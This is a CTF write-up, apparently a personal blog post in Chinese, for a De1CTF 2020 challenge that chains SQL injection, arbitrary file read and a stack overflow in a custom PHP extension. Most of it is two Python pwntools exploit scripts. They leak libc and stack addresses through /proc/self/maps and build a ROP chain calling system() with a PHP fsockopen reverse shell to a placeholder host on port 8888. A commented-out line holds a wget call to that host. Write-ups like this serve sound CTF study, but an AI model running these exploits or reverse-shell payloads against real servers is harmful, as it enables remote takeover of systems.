---
title: De1CTF 2020 Web+PWN mixture
date: 2020-05-05 00:00:00
categories:
- CTF/Pwn
tags: StackOverflow  
---

> 本题前面是Web，SQL注入注出管理员的密码，然后能任意读取文件，发现php使用了一个自定义的函数，读取到这个函数的实现的动态链接库，去除花指令后发现有个栈溢出，但是不知道为啥返回地址需要padding一些gadget才可以利用成功。

附件：[source.zip](https://xuanxuanblingbling.github.io/assets/attachment/source.zip)

## 成功exp

```python
from pwn import *
import requests,re

url  = "http://134.175.185.244"
libc = ELF("./libc.so")
session = requests.Session()

def login():
    paramsPost = {"password":"goodlucktoyou","submit":"submit","username":"admin"}
    session.post(url+"/index.php", data=paramsPost)

def send(payload):
    paramsPost = {"submit":"submit","search":payload}
    response = session.post(url+"/select.php", data=paramsPost)
    return re.findall('\<\/form\>(.*?)\<br\>',response.content)[0]

def read(payload):
    paramsPost = {"submit":"submit","search":payload}
    response = session.post(url+"/select.php", data=paramsPost)
    return response.content[1517+len(payload):-1]

login()

# leak libc and stack
libc.address = int('0x'+re.findall('(.*?)libc-2.28',read("/proc/self/maps"))[0][:12],16)
stack = u64(send('a'*0x64)[0x64:].ljust(8, b'\0'))

log.warn("stack: "+str(hex(stack)))
log.warn("stack: "+str(hex(libc.address)))

# gadget
pop_rdi  = libc.address + 0x023a5f
pop4_ret = libc.address + 0x024568

# ROP: command.ljust(0x88)+pop_rdi+stack+system
payload = "php -r '$sock=fsockopen(\"xxxx\",8888);exec(\"/bin/bash -i <&3 >&3 2>&3\");'\x00"
payload = payload.ljust(0x88)
# why must pop_rdi*10+pop4_ret+0*4 ???
payload += p64(pop_rdi)*10+p64(pop4_ret)+p64(0)*4
payload += p64(pop_rdi)+p64(stack)+p64(libc.symbols['system'])

# attack
send(payload)
```


## 自己瞎试

```python
from pwn import *
import requests,re

uu64    = lambda data   :u64(data.ljust(8, b'\0'))

#url  = "http://134.175.185.244"
url  = "http://49.51.251.99"
libc = ELF("./libc.so")
minc = ELF("./Minclude.so")
session = requests.Session()


def login():
    paramsPost = {"password":"goodlucktoyou","submit":"submit","username":"admin"}
    session.post(url+"/index.php", data=paramsPost)


def send(payload):
    paramsPost = {"submit":"submit","search":payload}
    try:
        response = session.post(url+"/select.php", data=paramsPost)
        print response.content
        return re.findall('\<\/form\>(.*?)\<br\>',response.content)[0]
    except:
        print "error"

def read(payload):
    paramsPost = {"submit":"submit","search":payload}
    response = session.post(url+"/select.php", data=paramsPost)
    #print response.content
    return response.content[1517+len(payload):-1]

def down(payload,filename):
    paramsPost = {"submit":"submit","search":payload}
    response = session.post(url+"/select.php", data=paramsPost)
    f = open(filename, "w")
    f.write(response.content[1517+len(payload):-2])

login()
stack = uu64(send('a'*0x64)[0x64:])
some  = uu64(send('a'*0x70)[0x70:])

down("/usr/lib/apache2/modules/libphp7.so","remotelibphp.so")
# down("/proc/self/maps","maps")
# down("/usr/local/lib/php/extensions/no-debug-non-zts-20170718/Minclude.so","Minc.so")

ret = 0x7f2fb1c111b4

libc.address = int('0x'+re.findall('(.*?)libc-2.28',read("/proc/self/maps"))[0][:12],16)
php_addr = int('0x'+re.findall('(.*?)libphp',read("/proc/self/maps"))[0][:12],16)
include_addr = int('0x'+re.findall('(.*?)Minclude',read("/proc/self/maps"))[0][:12],16)
log.warn("libc: "+str(hex(libc.address)))
log.warn("stack: "+str(hex(stack)))
log.warn("php: "+str(hex(php_addr)))
log.warn("some: "+str(hex(some)))
log.warn("Minclude: "+str(hex(include_addr)))
log.warn("ret: "+str(hex(ret-php_addr)))


pop_rdi = 0x23a5f  + libc.address
pop_rsi = 0x2440e  + libc.address
pop_rdx = 0x106725 + libc.address
pop_rax = 0x3a638  + libc.address
push_rax = 0x3680d + libc.address

ret1 = php_addr + 0x498670
ret2 = php_addr + 0x498816
ret3 = php_addr + 0x4EFD83
ret4 = php_addr + 0x4F645E



payload = 'a'*0x70+p64(some)+'a'*0x10
#payload += p64(pop_rdi)+p64(include_addr+0x2054)+p64(minc.plt['php_printf'])
payload += p64(ret)
#payload = +p64(include_addr+0x1368)+p64(ret)
send(payload)


# for i in range(0,255,1):
#     print i
#     payload = 'a'*0x70+p64(some)+'a'*0x10+chr(180)+chr(17)+chr(193)+chr(177)+chr(47)+chr(127)
#     send(payload)
# payload = 'a'*0x88+p64(pop_rdi)+p64(0x5)+p64(libc.symbols['sleep'])+p64(ret4)
# send(payload)

# down("/usr/lib/apache2/modules/libphp7.so","pwnlibphp.so")


# payload = 'a'*0x88+p64(pop_rdi)+p64(0x5)+p64(libc.symbols['sleep'])
# payload = '/tmp/xuanxuan\x00'.ljust(0x88, 'a')
# payload += p64(pop_rdi)+p64(stack)+p64(pop_rsi)+p64(0x41)+p64(libc.symbols['open'])
# send(payload)

# for i in range (10000):
#     test = stack + i*0xf
#     log.warn(hex(test))
#     session = requests.Session()
#     payload = 's;s;s;s;s;s;s;s;s;s;s;s;s;s;s;s;s;s;s;s;s;s;s;s;s;s;s;s;s;s;s;s;s;s;s;s;wget http://xxxx:8888\x00'.ljust(0x88,'a')
#     payload += p64(pop_rdi)+p64(test)+p64(libc.symbols['system'])
#     #print payload
#     send(payload)

#payload = '/bin/sleep\x005\x00'.ljust(0x88,'a')
#payload += p64(pop_rdi)+p64(0x5)+p64(libc.symbols['sleep'])
#payload += p64(pop_rdi)+p64(stack)+p64(pop_rsi)+p64(stack+12)+p64(libc.symbols['execl'])

# payload = 'a'*0x88
# payload += p64(pop_rdi)+p64(stack)+p64(pop_rsi)+p64(0x41)+p64(libc.symbols['open'])
```


- [Ubuntu 16.04 编译安装 PHP 7.2](https://blog.izgq.net/archives/910/)
- [php7编译后没有libphp7.so？](https://www.zhihu.com/question/38869703)
- [php 内核探秘之 PHP_FUNCTION 宏](https://segmentfault.com/a/1190000010529733)
- [第三节 函数的调用和执行](https://docs.kilvn.com/tipi/chapt04/04-03-function-call.html)


```
sudo apt-get install apache2-dev
--with-apxs2
```